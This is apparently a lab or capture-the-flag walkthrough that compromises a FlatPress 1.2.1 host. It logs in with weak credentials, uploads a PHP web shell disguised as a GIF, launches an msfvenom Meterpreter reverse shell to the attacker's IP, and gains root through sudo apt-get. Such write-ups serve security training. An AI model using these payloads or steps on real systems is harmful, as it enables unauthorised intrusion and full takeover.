`Running all scans on 192.168.217.29`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT     STATE SERVICE`
`22/tcp   open  ssh`
`80/tcp   open  http`
`8089/tcp open  unknown`

Checking out port 80, nothing sticks out - the sign in link doesn't work. 

Checking out port 8089, it looks a little better.
We can login with weak credentials admin/password.

Unfortunately no "About" section to give us the version. Let's try the CHANGELOG.md trick.

http://192.168.217.29:8089/CHANGELOG.md

This tells us we're on version 1.2.1.
![[Pasted image 20240222141803.png]]

https://github.com/flatpressblog/flatpress/issues/152

This tells us how to get remote code execution. 

Create and upload the php
`└─$ cat exploit.php`
`GIF89a;`
`<?php system($_GET['cmd']);?>`

Create an elf file and also upload it
`└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.222 LPORT=4445 -f elf -o 333.elf`

Open MSFconsole to catch
`└─$ msfconsole -x "use exploit/multi/handler;set PAYLOAD linux/x64/meterpreter/reverse_tcp;set LHOST 192.168.45.222;set LPORT 4445;exploit -j -z"`

Call the elf file
`http://192.168.217.29:8089/fp-content/attachs/exploit.php?cmd=./333.elf`

Switch to shell and upgrade
`meterpreter > shell`
`Process 1133 created.`
`Channel 1 created.`
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
`www-data@debian:~/flatpress/fp-content/attachs$`

Check sudo -l
`www-data@debian:~$ sudo -l`
`sudo -l`
`Matching Defaults entries for www-data on debian:`
    `env_reset, mail_badpass,`
    `secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin`

`User www-data may run the following commands on debian:`
    `(ALL) NOPASSWD: /usr/bin/apt-get`

Check if we can use this on GTFObins
https://gtfobins.github.io/gtfobins/apt-get/

Use it and get the flag
`www-data@debian:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh`
`sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh`
`cd /root`
`ls`
`email8.txt  proof.txt`
`cat proof.txt`
`051fc6de348bfb7e63a412721ac95d44`